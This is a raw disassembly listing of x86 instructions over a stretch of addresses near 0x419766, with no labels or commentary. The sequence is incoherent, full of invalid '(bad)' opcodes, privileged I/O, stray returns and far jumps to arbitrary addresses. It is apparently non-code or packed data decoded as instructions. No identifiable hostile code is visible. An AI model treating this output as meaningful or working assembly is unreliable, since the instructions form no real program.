  419766:	sub    DWORD PTR [ebp-0x2a4c7b07],esp
  41976c:	push   esp
  41976d:	fwait
  41976e:	push   ds
  41976f:	adc    eax,0xea7a5c96
  419774:	sbb    BYTE PTR [edx+0x4269a141],ch
  41977a:	ret    0xf467
  41977d:	fmul   st(2),st
  41977f:	sbb    al,0x8b
  419781:	(bad)  
  419782:	mov    eax,0x927673c2
  419787:	outs   dx,BYTE PTR ds:[esi]
  419788:	inc    ebx
  419789:	int3   
  41978a:	rcr    DWORD PTR [edi],0xd6
  41978d:	sbb    dl,BYTE PTR [eax+ebx*4-0x9]
  419791:	mov    al,ds:0x75aa9aad
  419796:	sbb    DWORD PTR [ecx],edx
  419798:	mov    bh,0xfe
  41979a:	scas   eax,DWORD PTR es:[edi]
  41979b:	scas   al,BYTE PTR es:[edi]
  41979c:	jg     0x41975f
  41979e:	push   es
  41979f:	cli    
  4197a0:	popf   
  4197a1:	ret    
  4197a2:	pop    eax
  4197a3:	jmp    0x249b5101
  4197a8:	mov    ds:0xb2ab8b6a,al
  4197ad:	mov    ebx,0x29f9c08
  4197b2:	jae    0x4197b9
  4197b4:	test   BYTE PTR [ebx],al
  4197b6:	sub    DWORD PTR [ebx],esi
  4197b8:	xor    eax,0xfeb5d4a8
  4197bd:	fsub   QWORD PTR [ebx-0x7]
  4197c0:	hlt    
  4197c1:	outs   dx,DWORD PTR ds:[esi]
  4197c2:	pop    edi
  4197c3:	jl     0x419801
  4197c5:	dec    ecx
  4197c6:	shr    dl,0x40
  4197c9:	xchg   ecx,eax
  4197ca:	mov    bh,0xb3
  4197cc:	ret    0xb140
  4197cf:	and    eax,0xee92d185
  4197d4:	loop   0x41978e
  4197d6:	in     al,0x8
  4197d8:	imul   esi,DWORD PTR [edi+0x143fb3ad],0x9afc1549
  4197e2:	stos   BYTE PTR es:[edi],al
  4197e3:	pop    edi
  4197e4:	(bad)  
  4197e5:	fldcw  WORD PTR [esi-0x6b]
  4197e8:	cli    
  4197e9:	sbb    BYTE PTR [eax+esi*4+0x7270d33c],bl
  4197f0:	sub    esi,DWORD PTR [edx-0x119d77a6]
  4197f6:	div    DWORD PTR [edi]
  4197f8:	jno    0x4197a3
  4197fa:	loop   0x4197ea
  4197fc:	mov    ds:0xdad9d1c8,eax
  419801:	pop    ss
  419802:	lock cmp eax,0xaf237963
  419808:	and    ah,cl
  41980a:	mov    ebx,0x8f7269c4
  41980f:	add    eax,0xd9e3a87d
  419814:	out    0xae,al
  419816:	pop    ecx
  419817:	jno    0x41987e
  419819:	adc    ah,BYTE PTR [esp+0x72]
  41981d:	jge    0x4197c7
  41981f:	cmpps  xmm4,XMMWORD PTR [esi],0x1f
  419823:	test   al,0x27
  419825:	les    ecx,FWORD PTR [ecx-0x23]
  419828:	push   ss
  419829:	jmp    0x850834d0
  41982e:	mov    esp,0x3a4ae64e
  419833:	sti    
  419834:	fwait
  419835:	pusha  
  419836:	mul    BYTE PTR [eax-0x5ffbe60e]
  41983c:	mov    eax,0xa2e4f6d1
  419841:	inc    ebp
  419842:	mov    edx,DWORD PTR cs:[edx+eax*2]
  419846:	add    al,0x12
  419848:	mov    cs,WORD PTR [edx]
  41984a:	mov    ecx,0x71284c11
  41984f:	jne    0x4197e7
  419851:	push   esi
  419852:	adc    eax,0x4720681b
  419857:	ficomp DWORD PTR [edx+0x12b1d133]
  41985d:	push   esi
  41985e:	pop    esi
  41985f:	mov    al,ds:0xd2ae1ba3
  419864:	sub    al,0xf6
  419866:	int    0x8e
  419868:	cld    
  419869:	sar    BYTE PTR [eax-0x40],0xf5
  41986d:	xor    eax,0x4c3a4d3d
  419872:	loop   0x419808
  419874:	cwde   
  419875:	xchg   esp,eax
  419876:	sar    BYTE PTR [ecx],0xc6
  419879:	adc    eax,0xa9a6d31d
  41987e:	inc    ecx
  41987f:	xchg   ebx,eax
  419880:	pushf  
  419881:	mov    esp,esi
  419883:	inc    eax
  419884:	outs   dx,BYTE PTR ds:[esi]
  419885:	ret    
  419886:	lahf   
  419887:	adc    DWORD PTR [edx+0x72ccdeaf],ebx
  41988d:	out    dx,al
  41988e:	test   ebx,ecx
  419890:	or     eax,0xbd4dbb49
  419895:	dec    ebp
  419896:	arpl   WORD PTR [ecx-0x2be83d69],bx
  41989c:	jmp    0x41984d
  41989e:	fcmovb st,st(5)
  4198a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198a1:	jp     0x4198b5
  4198a3:	std    
  4198a4:	mov    eax,0xe8cd960c
  4198a9:	mov    ecx,0x1f3ae48a
  4198ae:	jmp    0x7354f8fb
  4198b3:	lock out dx,al
  4198b5:	cmp    eax,0x75c2af25
  4198ba:	dec    eax
  4198bb:	js     0x4198cb
  4198bd:	mov    ebp,0xe1c5f870
  4198c2:	or     cl,BYTE PTR [edx-0x2b]
  4198c5:	pop    esi
  4198c6:	sti    
  4198c7:	mov    edi,esp
  4198c9:	lds    edx,FWORD PTR [edi]
  4198cb:	sbb    DWORD PTR [ebx],0x37
  4198ce:	cmp    eax,DWORD PTR [ecx-0x2561dc4d]
  4198d4:	dec    ebx
  4198d5:	dec    ebx
  4198d6:	fbld   TBYTE PTR [eax-0x4e23b604]
  4198dc:	mov    dl,0xcb
  4198de:	add    eax,DWORD PTR [esi-0x6d]
  4198e1:	xchg   edi,eax
  4198e2:	in     eax,dx
  4198e3:	pop    ds
  4198e4:	ficom  DWORD PTR [ecx]
  4198e6:	je     0x419896
  4198e8:	pop    ds
  4198e9:	int3   
  4198ea:	jbe    0x4198a3
  4198ec:	and    DWORD PTR [edi+0x3f],0x5158647d
  4198f3:	mov    edi,0x60f3b32
  4198f8:	popf   
  4198f9:	xchg   esp,eax
  4198fa:	push   0xa4a741a
  4198ff:	in     eax,0xbb
  419901:	imul   ecx,DWORD PTR [ebx+eax*8+0x71ca9e29],0x866424ed
  41990c:	mov    bl,0xd
  41990e:	inc    ebx
  41990f:	mov    edi,0x4192b439
  419914:	add    ecx,DWORD PTR [esi-0x1d]
  419917:	sbb    BYTE PTR [ebp+0x3137280e],0x11
  41991e:	addr16 jmp 0x7a4421f4
  419924:	mov    eax,0x61e37140
  419929:	or     al,BYTE PTR [edi-0x7]
  41992c:	and    DWORD PTR [eax-0x35],ebp
  41992f:	sub    BYTE PTR [edx+0x14b1b723],bl
  419935:	test   BYTE PTR [edi+0x74],0x1
  419939:	jmp    0x30a6:0xef771780
  419940:	push   ds
  419941:	and    dl,BYTE PTR [edx]
  419943:	aas    
  419944:	fdiv   st(5),st
  419946:	jns    0x41990c
  419948:	(bad)  
  419949:	jmp    0x41992f
  41994b:	mov    BYTE PTR [esi+edi*8],dh
  41994e:	loopne 0x419909
  419950:	add    DWORD PTR [ecx],esp
  419952:	add    eax,0xb4f79780
  419957:	mov    ?,WORD PTR [ebx+0x5f]
  41995a:	cld    
  41995b:	push   ds
  41995c:	dec    ecx
  41995d:	fs sbb al,0x37
  419960:	out    dx,eax
  419961:	lods   eax,DWORD PTR ds:[esi]
  419962:	mov    ebx,0xbba091f5
  419967:	test   al,0xf6
  419969:	sbb    DWORD PTR [edi],ebp
  41996b:	retf   0x3cab
  41996e:	jne    0x41993b
  419970:	dec    eax
  419971:	push   ds
  419972:	and    al,0x8d
  419974:	outs   dx,BYTE PTR ds:[esi]
  419975:	xor    BYTE PTR [esi],dl
  419977:	enter  0xcc83,0x13
  41997b:	and    eax,DWORD PTR [eax-0x79b764f0]
  419981:	cmp    bh,bh
  419983:	xor    eax,0x759b9823
  419988:	ds mov ch,0xfb
  41998b:	xchg   edi,eax
  41998c:	jle    0x4199c9
  41998e:	inc    ebx
  41998f:	adc    DWORD PTR [ecx],eax
  419991:	ret    
  419992:	sub    ecx,eax
  419994:	mov    esp,0x6965455
  419999:	sahf   
  41999a:	mov    bh,0x2d
  41999c:	push   eax
  41999d:	(bad)  
  41999e:	mov    ds:0xe4963e8,eax
  4199a3:	pusha  
  4199a4:	arpl   si,ax
  4199a6:	sahf   
  4199a7:	cli    
  4199a8:	add    al,0xb0
  4199aa:	dec    eax
  4199ab:	or     DWORD PTR [ebp-0x4],edx
  4199ae:	push   ss
  4199af:	xchg   esp,eax
  4199b0:	fldenv ds:0x26ba4317
  4199b6:	pop    edx
  4199b7:	test   al,0x62
  4199b9:	inc    BYTE PTR [edx]
  4199bb:	jnp    0x4199ac
  4199bd:	or     bl,dl
  4199bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199c0:	popf   
  4199c1:	mov    cl,bh
  4199c3:	hlt    
  4199c4:	push   esi
  4199c5:	pop    DWORD PTR [ecx+0x6b9ced34]
  4199cb:	and    al,0xaa
  4199cd:	push   cs
  4199ce:	into   
  4199cf:	rcr    BYTE PTR [esi],1
  4199d1:	jb     0x4199e8
  4199d3:	jge    0x419a02
  4199d5:	jl     0x419994
  4199d7:	mov    ebx,0x282ca14b
  4199dc:	cmp    BYTE PTR [edx-0x38907557],dh
  4199e2:	or     eax,0x746935d2
  4199e7:	mov    esp,0x2f97be6
  4199ec:	jge    0x419a2e
  4199ee:	test   DWORD PTR [edx+esi*8-0x7e],esi
  4199f2:	jmp    0x4e78:0x1ee26735
  4199f9:	fwait
  4199fa:	mov    eax,ds:0x417d6182
  4199ff:	aam    0x0
  419a01:	xchg   esp,eax
  419a02:	pushf  
  419a03:	fsub   DWORD PTR [edi]
  419a05:	sbb    eax,0x557d9174
  419a0a:	xchg   DWORD PTR [ebp-0x54],eax
  419a0d:	inc    ax
  419a0f:	mov    dl,0x13
  419a11:	aad    0x7b
  419a13:	sub    BYTE PTR [ebx],al
  419a15:	les    edx,FWORD PTR ds:[ebx-0x248ebbe]
  419a1c:	je     0x419a5d
  419a1e:	jg     0x419a08
  419a20:	cld    
  419a21:	push   0x24
  419a23:	popa   
  419a24:	xchg   ecx,eax
  419a25:	mov    al,ds:0xa6c9e122
  419a2a:	mov    ds:0xdfe5302e,eax
  419a2f:	cmp    BYTE PTR [edx+ebx*1+0x5a],cl
  419a33:	sbb    eax,0xdc64d2
  419a38:	xchg   DWORD PTR [ebx-0x8],edx
  419a3b:	ins    DWORD PTR es:[edi],dx
  419a3c:	cmp    eax,0x9acb0e36
  419a41:	sbb    eax,0x335f02f9
  419a46:	cwde   
  419a47:	les    ecx,FWORD PTR [esi]
  419a49:	inc    esp
  419a4a:	jle    0x419a5e
  419a4c:	dec    ebp
  419a4d:	dec    esp
  419a4e:	sub    al,0x62
  419a50:	mov    eax,0x63e819ab
  419a55:	jae    0x419a26
  419a57:	xchg   bh,ch
  419a59:	sbb    eax,DWORD PTR [edi-0x4385acf9]
  419a5f:	bound  eax,QWORD PTR [ecx]
  419a61:	mov    dh,0x98
  419a63:	dec    ebp
  419a64:	push   eax
  419a65:	push   ebp
  419a66:	adc    BYTE PTR [esp+ebx*8],dl
  419a69:	fist   WORD PTR [edx-0x6d]
  419a6c:	out    0xd9,al
  419a6e:	xor    eax,ebx
  419a70:	out    0xbc,eax
  419a72:	out    dx,al
  419a73:	gs pusha 
  419a75:	cli    
  419a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a77:	jne    0x419ab0
  419a79:	scas   al,BYTE PTR es:[edi]
  419a7a:	daa    
  419a7b:	mov    ds:0x8fd6f1e5,al
  419a80:	sbb    ebp,DWORD PTR [ecx-0x50]
  419a83:	push   0xb14e5771
  419a88:	setne  BYTE PTR [esi+0x30]
  419a8c:	sbb    edi,esi
  419a8e:	cmp    eax,DWORD PTR [edx+0x23]
  419a91:	loopne 0x419a38
  419a93:	rcl    DWORD PTR [ebx],0x66
  419a96:	sbb    al,0x9a
  419a98:	push   ecx
  419a99:	ror    BYTE PTR [edx],0xba
  419a9c:	iret   
  419a9d:	mov    eax,ds:0x7b3f78e8
  419aa2:	mul    BYTE PTR [edi]
  419aa4:	jmp    0xf8f4:0x47a3fcfb
  419aab:	sub    eax,DWORD PTR [ebx-0x45]
  419aae:	lds    edx,FWORD PTR [edx-0x2fcf1a51]
  419ab4:	jo     0x419b0c
  419ab6:	dec    esp
  419ab7:	add    al,0x7
  419ab9:	and    DWORD PTR [ebx+0x77],edx
  419abc:	mov    esi,0x5aebc756
  419ac1:	xchg   ebx,eax
  419ac2:	jmp    0x419b22
  419ac4:	retf   0x7c25
  419ac7:	fcom   QWORD PTR [edx+eiz*4+0x9064c5d]
  419ace:	je     0x419b3d
  419ad0:	std    
  419ad1:	ins    BYTE PTR es:[edi],dx
  419ad2:	mov    ecx,0xb2990d49
  419ad7:	loopne 0x419adc
  419ad9:	pusha  
  419ada:	pop    ebp
  419adb:	call   0x1f7:0x44a2b0c
  419ae2:	jb     0x419a95
  419ae4:	fwait
  419ae5:	xor    dh,BYTE PTR [ecx-0x1e3fef65]
  419aeb:	inc    esp
  419aec:	and    bl,ah
  419aee:	cmp    BYTE PTR [eax+0x251881ee],0x59
  419af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419af6:	ret    
  419af7:	mov    bh,0x52
  419af9:	jl     0x419a96
  419afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419afc:	xchg   edx,eax
  419afd:	fs or  eax,0x5c25c926
  419b03:	jo     0x419aa1
  419b05:	dec    edi
  419b06:	sub    al,0x5d
  419b08:	cmp    BYTE PTR [ecx-0x64886c11],al
  419b0e:	push   ss
  419b0f:	mov    dl,0x15
  419b11:	hlt    
  419b12:	sbb    cl,ah
  419b14:	push   eax
  419b15:	sti    
  419b16:	rcl    BYTE PTR [ebp-0x5f],1
  419b19:	jmp    0x57a0f27b
  419b1e:	nop
  419b1f:	mov    cl,0x70
  419b21:	inc    eax
  419b22:	jns    0x419b60
  419b24:	fadd   DWORD PTR [edx+0x400a339e]
  419b2a:	jg     0x419b5f
  419b2c:	gs mov ebp,0x6d93375e
  419b32:	jmp    0x419b18
  419b34:	(bad)  
  419b35:	into   
  419b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b37:	cmp    eax,0xecdc9f6b
  419b3c:	add    eax,0x2202de5d
  419b41:	sbb    DWORD PTR [ecx+ebp*1+0x25],esp
  419b45:	(bad)  
  419b46:	xor    eax,0x4c6ca010
  419b4b:	jmp    0x419b6c
  419b4d:	add    bh,BYTE PTR [edx]
  419b4f:	inc    esp
  419b50:	jo     0x419b15
  419b52:	rcl    DWORD PTR [ebp+edi*1-0x66b34df1],cl
  419b59:	mov    bh,0x1b
  419b5b:	adc    BYTE PTR [edx-0x417c2476],0xe1
  419b62:	lea    esi,[edi-0x2522917d]
  419b68:	arpl   WORD PTR [ecx+0x10c36b77],bp
  419b6e:	sub    al,0x4f
  419b70:	mov    cl,0x41
  419b72:	bnd jge 0x419af5
  419b75:	add    ebp,DWORD PTR [esi-0xd27ebdd]
  419b7b:	jmp    0x419b2c
  419b7d:	mov    eax,0xfae1992a
  419b82:	js     0x419b37
  419b84:	add    DWORD PTR [ebp-0x26],esp
  419b87:	dec    ebx
  419b88:	dec    esp
  419b89:	bound  esi,QWORD PTR [ecx]
  419b8b:	add    eax,0xafd3e4ea
  419b90:	dec    ebp
  419b91:	js     0x419b95
  419b93:	sbb    dl,ch
  419b95:	push   ecx
  419b96:	mov    al,BYTE PTR [edi+0x773353fb]
  419b9c:	ja     0x419b36
  419b9e:	or     DWORD PTR [edx-0x63],esp
  419ba1:	or     al,0x69
  419ba3:	sub    ebx,DWORD PTR [eax+0x761d0f7a]
  419ba9:	push   edi
  419baa:	cmp    ecx,edi
  419bac:	push   es
  419bad:	add    eax,0x41b6af66
  419bb2:	ret    
  419bb3:	sahf   
  419bb4:	jae    0x419c08
  419bb6:	cmp    BYTE PTR [edi],ah
  419bb8:	pop    es
  419bb9:	nop
  419bba:	retf   0xa4b9
  419bbd:	rol    esp,0x3c
  419bc0:	imul   edi,ecx,0xffffffef
  419bc3:	int3   
  419bc4:	mov    ebx,0x1d1f2af7
  419bc9:	jno    0xbff756b8
  419bcf:	rcl    BYTE PTR [edi],0xef
  419bd2:	xchg   esp,eax
  419bd3:	shl    DWORD PTR [ebp-0xc],0x81
  419bd7:	mov    ebp,0xb7c94897
  419bdc:	sub    ebx,DWORD PTR [ebx+0x24]
  419bdf:	jo     0x419bb4
  419be1:	push   0xc3f19e8a
  419be6:	add    BYTE PTR [ebx+0x5],0xda
  419bea:	fldcw  WORD PTR [eax]
  419bec:	and    BYTE PTR [eax+ecx*1-0x15],bh
  419bf0:	outs   dx,BYTE PTR ds:[esi]
  419bf1:	xor    edi,DWORD PTR [ebx+0x59de12e2]
  419bf7:	popa   
  419bf8:	adc    BYTE PTR [ecx-0x27],al
  419bfb:	and    ebp,eax
  419bfd:	mov    ds:0x3e26fc33,eax
  419c02:	push   edx
  419c03:	sbb    ecx,esp
  419c05:	add    ebp,ebx
  419c07:	mov    ebp,0x847b1a98
  419c0c:	ret    0x9e46
  419c0f:	clc    
  419c10:	jmp    0x419bf7
  419c12:	mov    bh,0x2f
  419c14:	inc    ebx
  419c15:	mov    ah,0xb0
  419c17:	sbb    BYTE PTR cs:[ecx+0x21],ch
  419c1b:	add    BYTE PTR [ecx-0x64c05dda],ah
  419c21:	fisub  WORD PTR [ebx]
  419c23:	iret   
  419c24:	mov    eax,ds:0xc7fdc437
  419c29:	pop    bx
  419c2b:	xabort 0x10
  419c2e:	push   esi
  419c2f:	lea    ebx,[eax-0x46]
  419c32:	and    esi,ebp
  419c34:	sbb    BYTE PTR [ecx+0x20],dl
  419c37:	sub    edx,ecx
  419c39:	sub    eax,DWORD PTR [eax]
  419c3b:	push   esi
  419c3c:	loopne 0x419bd2
  419c3e:	xor    BYTE PTR [esi+0x4a],0xf3
  419c42:	retf   
  419c43:	inc    edi
  419c44:	sub    DWORD PTR ds:0x143f6675,edx
  419c4a:	jg     0x419c08
  419c4c:	jae    0x419be7
  419c4e:	bound  ebp,QWORD PTR [ecx+0x5f103d8c]
  419c54:	mov    esp,0xffc88e
  419c59:	sub    al,0x9
  419c5b:	pusha  
  419c5c:	or     ebx,DWORD PTR [edx]
  419c5e:	sub    eax,0x512a2c5e
  419c63:	pop    ebx
  419c64:	push   ecx
  419c65:	inc    esp
  419c66:	xchg   edi,eax
  419c67:	leave  
  419c68:	int    0xc5
  419c6a:	or     al,0x80
  419c6c:	arpl   WORD PTR [eax],si
  419c6e:	ret    0xecee
  419c71:	cwde   
  419c72:	xchg   ebp,eax
  419c73:	lock mov cl,0xc6
  419c76:	xchg   esi,eax
  419c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c78:	jae    0x419c73
  419c7a:	inc    eax
  419c7b:	mov    bl,0x80
  419c7d:	pop    ss
  419c7e:	sbb    BYTE PTR [edi-0x6c90edb2],dh
  419c84:	test   eax,0x36b53b66
  419c89:	mov    ecx,DWORD PTR [eax+edi*8-0xa]
  419c8d:	nop
  419c8e:	rep stos DWORD PTR es:[edi],eax
  419c90:	adc    ebp,0x373ea0a7
  419c96:	inc    ecx
  419c97:	push   ebx
  419c98:	mov    dl,0xca
  419c9a:	inc    ebx
  419c9b:	(bad)  
  419c9c:	test   eax,0x13876c4b
  419ca1:	mov    bh,0x43
  419ca3:	or     eax,0xa109238f
  419ca8:	(bad)  
  419ca9:	adc    BYTE PTR [eax+ebx*1+0x36961879],al
  419cb0:	mov    ss,WORD PTR [edx+0x15]
  419cb3:	xor    esp,edx
  419cb5:	mov    ?,WORD PTR [ebx+0x7a]
  419cb8:	sub    BYTE PTR [ecx+eax*8-0xb],bh
  419cbc:	jo     0x419cba
  419cbe:	mov    bh,0xa6
  419cc0:	lods   al,BYTE PTR gs:[esi]
  419cc2:	sub    esi,edi
  419cc4:	sbb    ch,BYTE PTR [ebx+eax*4+0x30c06c7c]
  419ccb:	shl    BYTE PTR [ecx],0x1d
  419cce:	jae    0x419c82
  419cd0:	call   0x76b9e1c9
  419cd5:	dec    ebp
  419cd6:	dec    esi
  419cd7:	stos   BYTE PTR es:[edi],al
  419cd8:	push   es
  419cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cda:	jg     0x419d21
  419cdc:	(bad)  
  419cdd:	dec    esp
  419cde:	icebp  
  419cdf:	sbb    eax,0xc91d8017
  419ce4:	mov    bh,0xb1
  419ce6:	mov    ah,0x94
  419ce8:	jge    0x419cf6
  419cea:	push   ds
  419ceb:	xchg   edi,eax
  419cec:	retf   0xc023
  419cef:	ror    bh,cl
  419cf1:	cmp    DWORD PTR [edi+0x6b],edi
  419cf4:	(bad)  
  419cf5:	cli    
  419cf6:	pusha  
  419cf7:	dec    ebx
  419cf8:	rol    BYTE PTR ds:0x8d6b4c58,0x6e
  419cff:	in     al,0x3d
  419d01:	stc    
  419d02:	pushf  
  419d03:	call   0xd7e7:0x98f7ebe0
  419d0a:	aam    0x96
  419d0c:	cld    
  419d0d:	lea    dx,[edx+0x19ae1487]
  419d14:	aad    0x28
  419d16:	loope  0x419d45
  419d18:	sbb    bl,BYTE PTR [esi+0xa]
  419d1b:	std    
  419d1c:	push   esp
  419d1d:	ds iret 
  419d1f:	and    esi,DWORD PTR [ebp+0x41]
  419d22:	inc    eax
  419d23:	jns    0x419cbb
  419d25:	sub    eax,0x55eaeabc
  419d2a:	mov    cl,0xfd
  419d2c:	pop    ss
  419d2d:	cmp    ah,BYTE PTR [esi+0x4d409371]
  419d33:	or     ch,BYTE PTR [ecx]
  419d35:	jecxz  0x419d7d
  419d37:	cwde   
  419d38:	push   0x99ce199c
  419d3d:	inc    esi
  419d3e:	adc    eax,DWORD PTR [ecx-0x7e1a1a72]
  419d44:	xor    BYTE PTR [ecx+edx*8+0x4a],0x4
  419d49:	pop    ebx
  419d4a:	das    
  419d4b:	mov    ah,BYTE PTR [ebp+edi*2+0x78bbd3a4]
  419d52:	mov    edi,0x8f6dbcd2
  419d57:	dec    ebx
  419d58:	jae    0x419da6
  419d5a:	add    eax,0x7387b39e
  419d5f:	inc    ebp
  419d60:	loop   0x419d7c
  419d62:	cmp    BYTE PTR [ebx+esi*8],ch
  419d65:	xor    eax,0xe973f6a9
  419d6a:	iret   
  419d6b:	jno    0x419d88
  419d6d:	fnstcw WORD PTR [esi]
  419d6f:	inc    eax
  419d70:	and    al,0xfc
  419d72:	dec    eax
  419d73:	sub    bh,BYTE PTR [eax-0x5bc4f296]
  419d79:	push   esi
  419d7a:	je     0x419d68
  419d7c:	xor    bh,BYTE PTR [ebx+0x71]
  419d7f:	nop
  419d80:	js     0x419dbf
  419d82:	mov    ah,0xca
  419d84:	push   ebx
  419d85:	sbb    DWORD PTR [ebx-0x7570fa30],esp
  419d8b:	not    DWORD PTR [edi-0x37]
  419d8e:	cdq    
  419d8f:	cmp    bl,BYTE PTR [eax-0x7c]
  419d92:	iret   
  419d93:	jp     0x419d3d
  419d95:	lods   al,BYTE PTR ds:[esi]
  419d96:	cmp    BYTE PTR [ecx],bh
  419d98:	or     DWORD PTR [edi+eax*2-0x3a826c00],0xfffffff9
  419da0:	adc    eax,0x58131f9
  419da5:	jge    0x419d7b
  419da7:	jo     0x419d77
  419da9:	sbb    DWORD PTR [eax-0x5b],edi
  419dac:	adc    DWORD PTR [ecx-0x47],eax
  419daf:	sbb    ecx,DWORD PTR [ebx-0x7e]
  419db2:	xchg   ebp,eax
  419db3:	xchg   esi,eax
  419db4:	ja     0x419d8c
  419db6:	shr    DWORD PTR [ecx-0x61e91f7e],0x66
  419dbd:	push   0x19
  419dbf:	outs   dx,DWORD PTR ds:[esi]
  419dc0:	ins    BYTE PTR es:[edi],dx
  419dc1:	sar    DWORD PTR [ebx+0x148e38c9],0xdb
  419dc8:	outs   dx,BYTE PTR ds:[esi]
  419dc9:	inc    esi
  419dca:	mov    ch,0x3e
  419dcc:	xor    ebp,DWORD PTR [esp+eiz*2]
  419dcf:	retf   0x5486
  419dd2:	jnp    0x419e02
  419dd4:	mov    dh,0xe9
  419dd6:	cmp    ebx,esi
  419dd8:	arpl   WORD PTR [ecx+0x13cbeff5],ax
  419dde:	inc    ecx
  419ddf:	aas    
  419de0:	and    eax,esp
  419de2:	push   ds
  419de3:	inc    esp
  419de4:	xchg   DWORD PTR [edx+0x21],esp
  419de7:	sub    edx,DWORD PTR [ebx+0x2ceeb6fc]
  419ded:	jmp    0xce81d80c
  419df2:	mov    cl,0x80
  419df4:	pop    edx
  419df5:	popf   
  419df6:	adc    ecx,DWORD PTR [ebp+esi*4+0xa]
  419dfa:	stc    
  419dfb:	push   ebp
  419dfc:	xor    BYTE PTR fs:[edx-0x33f562f8],ch
  419e03:	push   edi
  419e04:	mov    es,WORD PTR [edi+eiz*4-0x30]
  419e08:	xchg   DWORD PTR [esi-0x1e617672],ebx
  419e0e:	(bad)  
  419e0f:	dec    BYTE PTR [eax-0x26ae5c0d]
  419e15:	out    dx,al
  419e16:	fld    QWORD PTR [eax+0x6]
  419e19:	cmp    al,0x4a
  419e1b:	mov    edi,0xbed3d4cf
  419e20:	cli    
  419e21:	sbb    BYTE PTR [ebx-0x72],bl
  419e24:	xor    BYTE PTR ds:[edi],ah
  419e27:	pop    esp
  419e28:	and    ah,dl
  419e2a:	add    cl,BYTE PTR [eax]
  419e2c:	sahf   
  419e2d:	mov    ah,BYTE PTR [esp+ecx*1]
  419e30:	cld    
  419e31:	retf   
  419e32:	fucomi st,st(4)
  419e34:	xchg   BYTE PTR [esi+0x16],cl
  419e37:	jge    0x419e3b
  419e39:	cwde   
  419e3a:	inc    edi
  419e3b:	jl     0x419eb1
  419e3d:	fisubr DWORD PTR [ebp-0x3a]
  419e40:	mov    ah,BYTE PTR [ebx-0x25]
  419e43:	retf   
  419e44:	dec    edi
  419e45:	adc    BYTE PTR [ebp+eiz*8+0x743c62fc],bl
  419e4c:	shl    DWORD PTR [edx-0x75],1
  419e4f:	leave  
  419e50:	ins    BYTE PTR es:[edi],dx
  419e51:	das    
  419e52:	add    esi,esp
  419e54:	das    
  419e55:	mov    edi,0xbf67e78e
  419e5a:	pusha  
  419e5b:	iret   
  419e5c:	mov    WORD PTR [esi+0x2a7ec8f7],ss
  419e62:	gs jb  0x419e7c
  419e65:	jg     0x419ec0
  419e67:	or     cl,ch
  419e69:	(bad)
  419e6c:	xor    eax,0x36488ec7
  419e71:	pop    edx
  419e72:	mov    edx,0x8ec97845
  419e77:	inc    ecx
  419e78:	adc    DWORD PTR [eax],0xffffffdb
  419e7b:	xor    al,0x23
  419e7d:	cli    
  419e7e:	fstp   DWORD PTR [esi-0x58321a3]
  419e84:	ret    0x646
  419e87:	jno    0x419ec1
  419e89:	xlat   BYTE PTR ds:[ebx]
  419e8a:	repz (bad) 
  419e8c:	call   0x5a96:0xf9509b1
  419e93:	and    bl,BYTE PTR [edi-0x41]
  419e96:	leave  
  419e97:	pcmpgtw mm3,QWORD PTR [ecx+0x8]
  419e9b:	pop    ebp
  419e9c:	in     al,dx
  419e9d:	int    0x64
  419e9f:	push   ds
  419ea0:	sbb    BYTE PTR [edi-0x6e],dh
  419ea3:	fbld   TBYTE PTR [ebp-0x3bfc1219]
  419ea9:	cdq    
  419eaa:	leave  
  419eab:	in     al,0x41
  419ead:	mov    ebx,0xb826cbb6
  419eb2:	jmp    0x5086:0x255a075e
  419eb9:	push   ds
  419eba:	mov    cl,0xb2
  419ebc:	mov    eax,ds:0xa0daef98
  419ec1:	nop
  419ec2:	jmp    0x6abf39b4
  419ec7:	sahf   
  419ec8:	or     edi,DWORD PTR ds:0xb1a36d5f
  419ece:	xchg   edi,eax
  419ecf:	dec    ecx
  419ed0:	mov    ss,WORD PTR [eax+0x2c530806]
  419ed6:	jmp    0x6bacfaed
  419edb:	loop   0x419e86
  419edd:	xor    al,0x3e
  419edf:	pop    esp
  419ee0:	adc    esp,DWORD PTR [esi-0x6a]
  419ee3:	push   edx
  419ee4:	in     eax,0xa9
  419ee6:	icebp  
  419ee7:	pop    DWORD PTR [edx-0x18aa232d]
  419eed:	cs ret 
  419eef:	jecxz  0x419e76
  419ef1:	jmp    0xa1:0xbdb411b1
  419ef8:	(bad)  
  419efa:	dec    ebx
  419efb:	into   
  419efc:	xchg   ebx,eax
  419efd:	add    eax,0x833db7c8
  419f02:	add    BYTE PTR [ebx+eax*1+0x74],0x34
  419f07:	push   esi
  419f08:	(bad)  
  419f0c:	adc    BYTE PTR [ecx+0x4f],ch
  419f0f:	or     eax,0xa5960332
  419f14:	sbb    eax,0xa2c1ae8
  419f19:	aam    0x3a
  419f1b:	xchg   BYTE PTR [eax],bl
  419f1d:	cmp    DWORD PTR [edi+edi*1-0x5c71b3e0],0xfffffff1
  419f25:	sbb    DWORD PTR ds:[ebp-0x4f15a8ff],ebx
  419f2c:	cdq    
  419f2d:	je     0x419f85
  419f2f:	call   0xff251b0a
  419f34:	and    al,0xc1
  419f36:	sub    dh,BYTE PTR [esi+0x6172ed9]
  419f3c:	sbb    al,BYTE PTR [ecx-0x5bced5f0]
  419f42:	in     eax,0x2a
  419f44:	dec    ebx
  419f45:	ret    0x78bb
  419f48:	pop    esp
  419f49:	push   edi
  419f4a:	pop    esp
  419f4b:	pop    esp
  419f4c:	pop    edx
  419f4d:	retf   
  419f4e:	out    0xce,eax
  419f50:	dec    ebp
  419f51:	aas    
  419f52:	std    
  419f53:	(bad)
  419f56:	add    dl,BYTE PTR [edx-0x54]
  419f59:	sbb    esp,DWORD PTR [edx-0x7658616d]
  419f5f:	pusha  
  419f60:	loopne 0x419fc4
  419f62:	sub    edi,edi
  419f64:	push   es
  419f65:	xchg   ebx,eax
  419f66:	push   esp
  419f67:	lea    ebp,[edi+ebp*1-0xc]
  419f6b:	call   0xe4b21cc4
  419f70:	mov    gs,WORD PTR ds:0xefbece1e
  419f76:	or     edx,ebx
  419f78:	imul   esp,edi,0xa720e4b2
  419f7e:	xchg   edx,eax
